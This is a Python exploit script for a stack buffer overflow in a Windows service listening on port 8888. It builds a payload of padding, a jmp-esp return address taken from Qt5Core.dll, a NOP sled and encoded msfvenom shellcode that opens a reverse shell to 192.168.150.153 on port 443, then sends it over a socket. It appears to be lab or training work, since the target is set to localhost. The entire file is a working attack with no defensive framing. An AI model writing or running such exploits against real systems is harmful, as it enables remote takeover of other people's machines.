import socket
import struct

target="127.0.0.1" 


junk =  b"A" * 1052
# !mona find -s '\xff\xe4' -m Qt5Core.dll
return_address = struct.pack('I', 0x68e05735)
# NOP sled
nop_sled = b"\x90" * 50

# shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.153 LPORT=443 -f python -e x86/shikata_ga_nai -b "\x00"

buf =  b""
buf += b"\xba\x49\x39\xd4\xbe\xdb\xca\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x1f\x37\x36"
buf += b"\x4b\x63\xaf\x34\xb4\x9b\x30\x59\x3c\x7e\x01\x59\x5a"
buf += b"\x0b\x32\x69\x28\x59\xbf\x02\x7c\x49\x34\x66\xa9\x7e"
buf += b"\xfd\xcd\x8f\xb1\xfe\x7e\xf3\xd0\x7c\x7d\x20\x32\xbc"
buf += b"\x4e\x35\x33\xf9\xb3\xb4\x61\x52\xbf\x6b\x95\xd7\xf5"
buf += b"\xb7\x1e\xab\x18\xb0\xc3\x7c\x1a\x91\x52\xf6\x45\x31"
buf += b"\x55\xdb\xfd\x78\x4d\x38\x3b\x32\xe6\x8a\xb7\xc5\x2e"
buf += b"\xc3\x38\x69\x0f\xeb\xca\x73\x48\xcc\x34\x06\xa0\x2e"
buf += b"\xc8\x11\x77\x4c\x16\x97\x63\xf6\xdd\x0f\x4f\x06\x31"
buf += b"\xc9\x04\x04\xfe\x9d\x42\x09\x01\x71\xf9\x35\x8a\x74"
buf += b"\x2d\xbc\xc8\x52\xe9\xe4\x8b\xfb\xa8\x40\x7d\x03\xaa"
buf += b"\x2a\x22\xa1\xa1\xc7\x37\xd8\xe8\x8f\xf4\xd1\x12\x50"
buf += b"\x93\x62\x61\x62\x3c\xd9\xed\xce\xb5\xc7\xea\x31\xec"
buf += b"\xb0\x64\xcc\x0f\xc1\xad\x0b\x5b\x91\xc5\xba\xe4\x7a"
buf += b"\x15\x42\x31\x2c\x45\xec\xea\x8d\x35\x4c\x5b\x66\x5f"
buf += b"\x43\x84\x96\x60\x89\xad\x3d\x9b\x5a\x12\x69\x35\x03"
buf += b"\xfa\x68\x39\x35\x40\xe5\xdf\x5f\xa6\xa0\x48\xc8\x5f"
buf += b"\xe9\x02\x69\x9f\x27\x6f\xa9\x2b\xc4\x90\x64\xdc\xa1"
buf += b"\x82\x11\x2c\xfc\xf8\xb4\x33\x2a\x94\x5b\xa1\xb1\x64"
buf += b"\x15\xda\x6d\x33\x72\x2c\x64\xd1\x6e\x17\xde\xc7\x72"
buf += b"\xc1\x19\x43\xa9\x32\xa7\x4a\x3c\x0e\x83\x5c\xf8\x8f"
buf += b"\x8f\x08\x54\xc6\x59\xe6\x12\xb0\x2b\x50\xcd\x6f\xe2"
buf += b"\x34\x88\x43\x35\x42\x95\x89\xc3\xaa\x24\x64\x92\xd5"
buf += b"\x89\xe0\x12\xae\xf7\x90\xdd\x65\xbc\xa1\x97\x27\x95"
buf += b"\x29\x7e\xb2\xa7\x37\x81\x69\xeb\x41\x02\x9b\x94\xb5"
buf += b"\x1a\xee\x91\xf2\x9c\x03\xe8\x6b\x49\x23\x5f\x8b\x58"

payload = junk + return_address + nop_sled + buf

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,8888))
s.send(payload)
s.close()
